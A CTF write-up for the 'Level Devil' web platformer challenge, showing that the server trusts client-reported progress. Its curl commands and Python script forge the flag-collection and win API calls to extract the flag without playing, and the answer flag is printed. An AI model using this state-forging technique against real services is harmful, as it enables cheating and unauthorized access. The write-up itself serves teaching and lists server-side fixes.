# Bypass CTF Challenge Writeup : Level Devil 

## Challenge Description
> Looks simple. Plays dirty.
> 
> Welcome to Level Devil, a platformer that refuses to play fair.
> The path looks obvious, the goal seems close—but this level thrives on deception.
> 
> Hidden traps, unreliable platforms, and misleading progress will test your patience and awareness.
> Not everything you see is safe, and not every solution lies in plain sight.
> 
> Your mission is simple:
> Reach the end and claim what's hidden.
> 
> But remember—
> in this level, trust is your biggest weakness.
> 
> Good luck. You'll need it.

## Challenge Overview

Level Devil is a web-based platformer game challenge that combines:
- **Game Mechanics**: A deceptive platformer with hidden traps and troll elements
- **Client-Side Protections**: Intentional blocking of browser developer tools (F12, Ctrl+Shift+I, right-click)
- **API-Based Game Logic**: Server-side endpoints managing game state

The game features falling platforms, hidden obstacles, and a gold flag item that must be collected before reaching the exit door to win. However, the real challenge isn't beating the platformer—it's understanding how the game validates success.

## Initial Analysis

### What You See

When you first access the game:
1. A platformer level with a player character
2. Various platforms and obstacles
3. A gold flag to collect
4. An exit door at the end
5. Browser developer tools are blocked

### The Deception

The challenge description emphasizes "trust is your biggest weakness." This hints at:
- Don't trust the client-side game logic
- Don't trust that you need to actually play the game
- Don't trust that the frontend protections are effective

### Developer Tools Blocking

The game implements client-side protection by preventing common developer tool shortcuts:

```javascript
// Blocked actions
- F12
- Ctrl+Shift+I
- Ctrl+Shift+C
- Ctrl+Shift+J
- Right-click context menu
```

This is a form of **Security by Obscurity** intended to frustrate casual inspection. However, it only affects browser-based interaction—not direct API calls.

## Vulnerability Analysis

### API Endpoints Discovery

By examining network traffic or the application source (accessible via curl), we discover three critical API endpoints:

1. **POST /api/start**
   - Purpose: Initialize a new game session
   - Returns: A unique `session_id`

2. **POST /api/collect_flag**
   - Purpose: Mark that the player has collected the in-game gold flag
   - Requires: Valid `session_id`
   - Returns: Status confirmation

3. **POST /api/win**
   - Purpose: Validate completion and return the CTF flag
   - Requires: Valid `session_id` that has collected the flag
   - Returns: The actual CTF flag

### The Critical Flaw

**Insecure Client-Side Logic + Broken Access Control**

The server makes several dangerous assumptions:
- It trusts any client with a valid `session_id`
- It does not validate player coordinates or movement
- It does not verify that the player actually played the game
- It does not check timing or sequence beyond basic state flags

The server essentially says:
> "If you have a session ID and you tell me you collected the flag, I'll give you the win flag."

This is a textbook example of trusting the client to honestly report game state.

## Exploitation

### Strategy

Since the server doesn't validate actual gameplay, we can:
1. Bypass the client entirely
2. Directly interact with the API endpoints
3. Simulate the game flow without playing

### Tools

- **curl**: Command-line HTTP client (bypasses browser restrictions)
- **Any HTTP client**: Postman, Burp Suite, Python requests, etc.

### Step-by-Step Exploitation

#### Step 1: Start a New Session

Request a new game session from the server:

```bash
curl -X POST https://level-devil-dcmi.onrender.com/api/start
```

**Response:**
```json
{
  "session_id": "e782e0dd-d29f-4692-b191-c7f9311c58c5"
}
```

Save this `session_id` for subsequent requests.

#### Step 2: Fake Flag Collection

Tell the server we've collected the gold flag (without actually playing):

```bash
curl -X POST https://level-devil-dcmi.onrender.com/api/collect_flag \
     -H "Content-Type: application/json" \
     -d '{"session_id": "e782e0dd-d29f-4692-b191-c7f9311c58c5"}'
```

**Response:**
```json
{
  "status": "ok"
}
```

The server accepts our claim without verification!

#### Step 3: Claim Victory

Request the CTF flag by triggering the win condition:

```bash
curl -X POST https://level-devil-dcmi.onrender.com/api/win \
     -H "Content-Type: application/json" \
     -d '{"session_id": "e782e0dd-d29f-4692-b191-c7f9311c58c5"}'
```

**Response:**
```json
{
  "flag": "BYPASS_CTF{l3v3l_d3v1l_n0t_s0_1nn0c3nt}"
}
```

Success! We've beaten the "Level Devil" without ever playing the actual game.

### Complete Python Solution

For those who prefer scripting:

```python
#!/usr/bin/env python3
import requests
import json

BASE_URL = "https://level-devil-dcmi.onrender.com"

def exploit():
    print("🎮 Level Devil CTF Exploit")
    print("=" * 50)
    
    # Step 1: Start session
    print("\n[1] Starting new session...")
    response = requests.post(f"{BASE_URL}/api/start")
    session_id = response.json()["session_id"]
    print(f"    Session ID: {session_id}")
    
    # Step 2: Collect flag (fake)
    print("\n[2] Collecting flag (without playing)...")
    response = requests.post(
        f"{BASE_URL}/api/collect_flag",
        json={"session_id": session_id}
    )
    print(f"    Status: {response.json()['status']}")
    
    # Step 3: Win the game
    print("\n[3] Claiming victory...")
    response = requests.post(
        f"{BASE_URL}/api/win",
        json={"session_id": session_id}
    )
    flag = response.json()["flag"]
    
    print("\n" + "=" * 50)
    print(f"🏆 FLAG: {flag}")
    print("=" * 50)

if __name__ == "__main__":
    exploit()
```

**Output:**
```
🎮 Level Devil CTF Exploit
==================================================

[1] Starting new session...
    Session ID: e782e0dd-d29f-4692-b191-c7f9311c58c5

[2] Collecting flag (without playing)...
    Status: ok

[3] Claiming victory...

==================================================
🏆 FLAG: BYPASS_CTF{l3v3l_d3v1l_n0t_s0_1nn0c3nt}
==================================================
```

## Flag
```
BYPASS_CTF{l3v3l_d3v1l_n0t_s0_1nn0c3nt}
```

## The Irony

The challenge description warned us:
- **"Trust is your biggest weakness"** → Don't trust client-side validation
- **"Not every solution lies in plain sight"** → The solution is in the API, not the game
- **"Plays dirty"** → The frontend blocks tools, but that's just misdirection
- **"Level Devil not so innocent"** (flag text) → The game itself is the deception

The game's difficulty, traps, and protections were all red herrings. The real vulnerability was trusting the client to honestly report progress.

## Security Vulnerabilities Identified

### 1. **Insecure Direct Object Reference (IDOR)**
The `session_id` is the only authentication mechanism, and it's client-controlled.

### 2. **Broken Access Control**
No validation that the player actually performed required actions (collecting flag, reaching door).

### 3. **Security by Obscurity**
Blocking F12 doesn't prevent API access via curl, Postman, or browser network inspection via other means.

### 4. **Missing Server-Side Validation**
The server should validate:
- Player coordinates at flag collection
- Player coordinates at win condition
- Time-based impossibility (too fast completion)
- Movement physics and collision detection

### 5. **Stateless Trust Model**
The server accepts client claims about game state without verification.

## Key Takeaways

### For CTF Players (us)

1. **Question Everything**: When developer tools are blocked, ask why. What are they hiding?

2. **Think Outside the UI**: The game interface is just one way to interact. APIs are often more honest about what's actually happening.

3. **Client-Side is Not Security**: Any protection that runs in the browser can be bypassed.

4. **Read the Hints**: "Trust is your biggest weakness" directly told us not to trust the client-side logic.

5. **Use Alternative Tools**: When browsers are restricted, use curl, Postman, or programming languages.

## Tools Used

- **curl**: Command-line HTTP client
- **Browser Network Tab**: (if accessible) to observe API calls
- **Python requests** (optional): For scripting the exploitation
